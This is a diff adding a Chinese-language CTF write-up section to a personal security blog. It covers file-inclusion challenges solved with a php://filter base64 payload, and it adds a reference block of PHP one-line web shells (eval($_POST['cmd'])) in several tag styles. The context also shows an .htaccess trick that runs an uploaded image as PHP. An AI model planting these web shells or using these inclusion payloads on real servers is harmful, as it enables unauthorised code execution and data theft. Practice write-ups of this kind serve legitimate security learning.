@@ -107,8 +107,20 @@
 <meta property="og:image" content="http://example.com/CTF/79.PNG">
 <meta property="og:image" content="http://example.com/CTF/80.PNG">
 <meta property="og:image" content="http://example.com/CTF/81.PNG">
+<meta property="og:image" content="http://example.com/CTF/82.PNG">
+<meta property="og:image" content="http://example.com/CTF/83.PNG">
+<meta property="og:image" content="http://example.com/CTF/84.PNG">
+<meta property="og:image" content="http://example.com/CTF/85.PNG">
+<meta property="og:image" content="http://example.com/CTF/86.PNG">
+<meta property="og:image" content="http://example.com/CTF/87.PNG">
+<meta property="og:image" content="http://example.com/CTF/88.PNG">
+<meta property="og:image" content="http://example.com/CTF/89.PNG">
+<meta property="og:image" content="http://example.com/CTF/90.PNG">
+<meta property="og:image" content="http://example.com/CTF/91.PNG">
+<meta property="og:image" content="http://example.com/CTF/92.PNG">
+<meta property="og:image" content="http://example.com/CTF/93.PNG">
 <meta property="article:published_time" content="2024-03-04T14:44:01.000Z">
-<meta property="article:modified_time" content="2024-04-15T12:35:56.080Z">
+<meta property="article:modified_time" content="2024-04-22T15:19:43.185Z">
 <meta property="article:author" content="MoGo">
 <meta property="article:tag" content="网络信息安全">
 <meta name="twitter:card" content="summary">
@@ -297,7 +309,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-04-15 20:35:56" itemprop="dateModified" datetime="2024-04-15T20:35:56+08:00">2024-04-15</time>
+                <time title="修改时间：2024-04-22 23:19:43" itemprop="dateModified" datetime="2024-04-22T23:19:43+08:00">2024-04-22</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -358,6 +370,14 @@
 <p>3.BUUCTF-Web-[MRCTF2020]你传你🐎呢<br><img src="/CTF/74.PNG"><br>真是一场激情的解题呢，老样子先拦截，后上传<br><img src="/CTF/75.PNG"><br><img src="/CTF/76.PNG"><br><img src="/CTF/77.PNG"><br>这里就可以确定是黑名单过滤了<br>经过资料的查询和学习，这里需要利用利用文件解析漏洞，大致就像解析图片马的一个文件<br>写一个.htaccess文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.jpg&quot;&gt;   (这里确定自己上传的图片码的名字)</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
 <p>这里上传时需注意将文件格式改为jpeg否则无法上传成功<br><img src="/CTF/78.PNG"><br>ok,既然已经得到，那我们直接蚁剑开连<br><img src="/CTF/79.PNG"><br>（注:这里连接的是上传的jpg图片马）<br><img src="/CTF/80.PNG"><br>成功拿到flag<br><img src="/CTF/81.PNG"><br>下期再见</p>
+<p>2024&#x2F;4&#x2F;22<br>又到了熟悉的周一，继续来做几个ctf题目<br>1.BugKu-Web-文件包含<br><img src="/CTF/82.PNG"><br>由此我们可以得知file为注入点，要运行index.php<br>直接尝试连接<br><img src="/CTF/83.PNG"><br>显示无法使用该页面，这里我们使用伪协议php:&#x2F;&#x2F;fitter,这里需要注意，它与函数结合会导致直接运行，因此<br>我们这里对其进行编码输出，令其无法执行.<br>这里使用base64进行编码<br><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code><br><img src="/CTF/84.PNG"><br>成功显示页面，进行base64解码获得flag<br><img src="/CTF/85.PNG"><br>flag{ee3ec0c3ec7b492161711f6090499a11}</p>
+<p>2.BugKu-Web-文件包含<br>这道题没什么特别的知识点，为了节约点金币，直接上知识点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval($_POST[&#x27;cmd&#x27;]); </span><br><span class="line"> ?&gt;</span><br><span class="line">php推荐使用的标记风格。</span><br><span class="line">服务器管理员无法禁用，所有服务器上均可使用该风格</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> &lt;script language=&quot;php&quot;&gt;</span><br><span class="line">    eval($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script language=&quot;PhP&quot;&gt;</span><br><span class="line">    eval($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">默认开启，无法禁用</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;? </span><br><span class="line">    eval($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">此种风格需要在配置文件php.ini中启用short_open_tage选项</span><br><span class="line">此种风格在许多环境中默认是不支持的</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;% </span><br><span class="line">    eval($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">%&gt;</span><br><span class="line">种风格需要在配置文件php.ini中启用asp_tag选项</span><br><span class="line">在默认情况下是禁用的</span><br></pre></td></tr></table></figure>
+
+
+
+<p>3.BUUCTF-[ACTF2020 新生赛]Include<br><img src="/CTF/86.PNG"><br>这里让我们找flag，又是熟悉的感觉，再次尝试伪协议，转换为base64<br><img src="/CTF/87.PNG"><br>也是成功拿下（知识点有点重复了）<br><img src="/CTF/88.PNG"></p>
+<p>4.BUUCTF-[极客大挑战 2019]Secret File<br><img src="/CTF/89.PNG"><br>真是紧张又刺激的页面呢<br>通过查看源代码发现隐藏超链接，后又发现一个超链接，但都一无所获，因此这里决定抓包查看<br><img src="/CTF/90.PNG"><br>经过一番查看发现注释文件secr3t.php<br><img src="/CTF/91.PNG"><br>打开进行查看<br>得知flag在flag.php中，file可进行文件包含漏洞，但这里无法直接查看，还是需要利用到伪协议<br>其中禁止使用..&#x2F;,tp,input,data<br><img src="/CTF/92.PNG"><br>解码拿到flag<br><img src="/CTF/93.PNG"><br>完结，睡大觉</p>
 
     </div>
 
